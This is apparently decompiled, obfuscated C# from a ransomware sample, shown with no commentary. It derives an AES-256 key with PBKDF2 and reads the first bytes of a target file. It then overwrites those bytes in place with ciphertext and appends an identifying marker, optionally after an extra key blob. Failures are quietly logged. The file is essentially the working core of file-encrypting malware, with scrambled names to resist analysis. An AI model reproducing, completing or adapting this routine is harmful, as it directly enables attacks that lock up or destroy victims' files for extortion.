using System;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Security.Cryptography;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace gtzdezosLTmcL;

public static class GEuJUSBegihvL
{
	[NonSerialized]
	internal static GetString getString_0;

	public static byte[] XbeuvhWuaVaPsHGUr(byte[] byte_0, byte[] byte_1, byte[] byte_2)
	{
		byte[] result = null;
		Rfc2898DeriveBytes rfc2898DeriveBytes = mkoRAitllccElK(byte_1, byte_2);
		byte_1 = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.None;
		aes.Mode = CipherMode.CBC;
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(byte_0, 0, byte_0.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		rfc2898DeriveBytes.Dispose();
		return result;
	}

	public static Rfc2898DeriveBytes mkoRAitllccElK(byte[] byte_0, byte[] byte_1)
	{
		return new Rfc2898DeriveBytes(byte_0, byte_1, 52768);
	}

	public static byte[] bfWFSCemEEeTu(string string_0, int int_0)
	{
		byte[] array = new byte[int_0];
		try
		{
			if (pjsEsrnLXK.AbBpmUBaDgr == getString_0(107396981))
			{
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(string_0, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Read(array, 0, int_0);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				return array;
			}
			FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream.Read(array, 0, int_0);
			fileStream.Close();
			fileStream.Dispose();
			return array;
		}
		catch (Exception ex)
		{
			if (pjsEsrnLXK.EgSuBjaBcbD)
			{
				try
				{
					File.AppendAllText(pjsEsrnLXK.wWeASlndaLw, getString_0(107355711) + string_0 + getString_0(107367007) + ex.Message + getString_0(107396737));
				}
				catch (Exception)
				{
				}
			}
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream2.Read(array, 0, int_0);
			fileStream2.Close();
			fileStream2.Dispose();
			return array;
		}
	}

	public static void KtIDQYwaMrpj(string WIrzyIWtBqpPE, byte[] hCQuKrqBjCRt, byte[] jPCJMjeJHWfA = null)
	{
		try
		{
			byte[] array = null;
			if (pjsEsrnLXK.AbBpmUBaDgr == getString_0(107396981))
			{
				array = (pjsEsrnLXK.rwWNCMXwImSXYT ? Encoding.ASCII.GetBytes(pjsEsrnLXK.rZFwMCmAYamD(pjsEsrnLXK.DoJEmVKnztsR) + pjsEsrnLXK.rZFwMCmAYamD(getString_0(107366917)) + Convert.ToString(pjsEsrnLXK.QBZQQShjDLV) + pjsEsrnLXK.rZFwMCmAYamD(getString_0(107366917))) : Encoding.ASCII.GetBytes(pjsEsrnLXK.rZFwMCmAYamD(pjsEsrnLXK.DoJEmVKnztsR) + pjsEsrnLXK.rZFwMCmAYamD(getString_0(107366926)) + Convert.ToString(pjsEsrnLXK.QBZQQShjDLV) + pjsEsrnLXK.rZFwMCmAYamD(getString_0(107366926))));
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(WIrzyIWtBqpPE, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Write(hCQuKrqBjCRt, 0, hCQuKrqBjCRt.Length);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				using FileStream fileStream = new FileStream(WIrzyIWtBqpPE, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!pjsEsrnLXK.rwWNCMXwImSXYT)
				{
					fileStream.Write(array, 0, array.Length);
					return;
				}
				fileStream.Write(jPCJMjeJHWfA, 0, jPCJMjeJHWfA.Length);
				fileStream.Write(array, 0, array.Length);
				return;
			}
			array = (pjsEsrnLXK.rwWNCMXwImSXYT ? Encoding.ASCII.GetBytes(pjsEsrnLXK.rZFwMCmAYamD(pjsEsrnLXK.DoJEmVKnztsR) + pjsEsrnLXK.rZFwMCmAYamD(getString_0(107366917)) + Convert.ToString(pjsEsrnLXK.QBZQQShjDLV) + pjsEsrnLXK.rZFwMCmAYamD(getString_0(107366917))) : Encoding.ASCII.GetBytes(pjsEsrnLXK.rZFwMCmAYamD(pjsEsrnLXK.DoJEmVKnztsR) + pjsEsrnLXK.rZFwMCmAYamD(getString_0(107366926)) + Convert.ToString(pjsEsrnLXK.QBZQQShjDLV) + pjsEsrnLXK.rZFwMCmAYamD(getString_0(107366926))));
			FileStream fileStream2 = new FileStream(WIrzyIWtBqpPE, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
			fileStream2.Write(hCQuKrqBjCRt, 0, hCQuKrqBjCRt.Length);
			fileStream2.Close();
			fileStream2.Dispose();
			using FileStream fileStream3 = new FileStream(WIrzyIWtBqpPE, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			if (!pjsEsrnLXK.rwWNCMXwImSXYT)
			{
				fileStream3.Write(array, 0, array.Length);
				return;
			}
			fileStream3.Write(jPCJMjeJHWfA, 0, jPCJMjeJHWfA.Length);
			fileStream3.Write(array, 0, array.Length);
		}
		catch (Exception ex)
		{
			if (pjsEsrnLXK.EgSuBjaBcbD)
			{
				try
				{
					File.AppendAllText(pjsEsrnLXK.wWeASlndaLw, getString_0(107355711) + WIrzyIWtBqpPE + getString_0(107366940) + ex.Message + getString_0(107396737));
				}
				catch (Exception)
				{
				}
			}
			byte[] array2 = null;
			array2 = (pjsEsrnLXK.rwWNCMXwImSXYT ? Encoding.ASCII.GetBytes(pjsEsrnLXK.rZFwMCmAYamD(pjsEsrnLXK.DoJEmVKnztsR) + pjsEsrnLXK.rZFwMCmAYamD(getString_0(107366917)) + Convert.ToString(pjsEsrnLXK.QBZQQShjDLV) + pjsEsrnLXK.rZFwMCmAYamD(getString_0(107366917))) : Encoding.ASCII.GetBytes(pjsEsrnLXK.rZFwMCmAYamD(pjsEsrnLXK.DoJEmVKnztsR) + pjsEsrnLXK.rZFwMCmAYamD(getString_0(107366926)) + Convert.ToString(pjsEsrnLXK.QBZQQShjDLV) + pjsEsrnLXK.rZFwMCmAYamD(getString_0(107366926))));
			FileStream fileStream4 = new FileStream(WIrzyIWtBqpPE, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
			fileStream4.Write(hCQuKrqBjCRt, 0, hCQuKrqBjCRt.Length);
			fileStream4.Close();
			fileStream4.Dispose();
			using FileStream fileStream5 = new FileStream(WIrzyIWtBqpPE, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			if (!pjsEsrnLXK.rwWNCMXwImSXYT)
			{
				fileStream5.Write(array2, 0, array2.Length);
				return;
			}
			fileStream5.Write(jPCJMjeJHWfA, 0, jPCJMjeJHWfA.Length);
			fileStream5.Write(array2, 0, array2.Length);
		}
	}

	static GEuJUSBegihvL()
	{
		Strings.CreateGetStringDelegate(typeof(GEuJUSBegihvL));
	}
}
